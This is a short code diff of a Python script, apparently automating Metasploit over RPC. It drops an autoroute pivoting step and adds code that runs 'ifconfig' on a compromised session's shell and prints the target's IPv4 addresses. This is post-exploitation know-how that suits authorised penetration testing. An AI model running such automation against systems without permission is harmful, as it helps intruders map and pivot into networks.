@@ -9,12 +9,22 @@ shell = client.sessions.session(id)
 if(shell is None):
     print("time out, no shell :(")
 else:
-    print(msf_get_timestamp.run(client, id))
-    console = client.consoles.console()
-    # console != shell think local-attacker vs target access
-    console.write('use post/multi/manage/autoroute')
-    console.write('set NETMASK 255.255.255.0')
-    console.write('set SESSION {0}'.format(id))
-    console.write('set CMD autoadd')
-    console.write('run -j')
-    pass # for breakpoint
+    shell.write('ifconfig\n')
+    r = ''
+    while len(r) == 0:
+        r = shell.read() # don't access shell in Armitage/msfconsole
+    
+    interfaces = dict()
+    for l1 in r.split('\n\n'):
+        intf = ''
+        for l2 in l1.split('\n'):
+            if(l2.startswith('Interface')):
+                intf = l2.strip()
+                interfaces[intf] = dict()
+            if(' : ' in l2):
+                kv = l2.split(' : ')
+                interfaces[intf][kv[0].strip()] = kv[1]
+    
+    for k1, v1 in interfaces.items():
+        print(v1['IPv4 Address'])
+            
